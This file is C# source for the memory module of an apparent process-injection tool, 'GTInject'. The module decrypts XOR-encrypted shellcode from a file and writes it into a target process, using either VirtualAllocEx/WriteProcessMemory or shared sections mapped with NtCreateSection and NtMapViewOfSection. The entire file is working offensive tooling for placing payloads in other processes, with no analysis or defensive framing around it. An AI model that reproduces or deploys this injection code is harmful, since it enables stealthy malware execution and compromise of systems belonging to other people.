using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace GTInject.memoryOptions
{
    internal class memory
    {
        public static (IntPtr, Process) SelectMemOption(int memoption, int execoption, string xorkey, string binsrctype, string binsrcpath, int pid, int tid)
        {
            switch (memoption)
            {
                case 1:
                    return memopt1(binsrctype, binsrcpath, xorkey, pid);
                case 2:
                    return memopt2(binsrctype, binsrcpath, xorkey, pid);
                case 3:
                    return (IntPtr.Zero, null);
            }
            Console.WriteLine(  " [-] Bad memory allocation technique, enter an integer Memory Option selection");
            return (IntPtr.Zero, null);
        }
        private static (IntPtr, Process) memopt1(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 1 == VirtualAllocEx && WriteProcessMemory (WINAPI)
            /////////////////////////////////////

            Console.WriteLine(  "  Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");

            // Got what we need to start injection
            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
                
            Process pid = Process.GetProcessById(ProcID);
            Console.WriteLine( " have pid " + pid.Id + " " + pid);
            IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
            Console.WriteLine(  " allocated mem at address " + vMemAddr);
            IntPtr outsize;
            var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically

            if (writeResp)
            {
                Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs: " + writeResp);
                return (vMemAddr, pid);
            }
            else
            {
                Console.WriteLine(" Failed to write with VirtAllocEx and WriteProcMem WINAPIs");
                return (IntPtr.Zero, null);
            }
        }


        private static (IntPtr, Process) memopt2(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 2 == NtCreateSection, NtMapViewOfSection, RtlCopyMemory (NTAPI)
            /////////////////////////////////////
            // https://github.com/tasox/CSharp_Process_Injection/blob/main/04.%20Process_Injection_template_(Low%20Level%20Windows%20API)%20-%20Modify%20Permissions/Program.cs 
            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            int len = plainBytes.Length;
            uint bufferLength = (uint)len;
            IntPtr sectionHandler = new IntPtr();
            long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(AllocationType.Commit), IntPtr.Zero);


            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = 4096;
            ulong offsetSectionLocal = new ulong();

            Process localProc = Process.GetCurrentProcess();
            long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE));


            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = 4096;
            ulong offsetSectionRemote = new ulong();

            Process remoteProc = Process.GetProcessById(ProcID);

            long mapSectionRemote = NtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));

            // RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
            Marshal.FreeHGlobal(unmanagedPointer);

            return (remoteBaseAddress, remoteProc);


        }


        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////



        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////

        [Flags]
        public enum NtSectionPerms
        {
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_EXECUTE = 0x0008
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlCopyMemory(IntPtr dest, IntPtr src, uint length);
    }
}
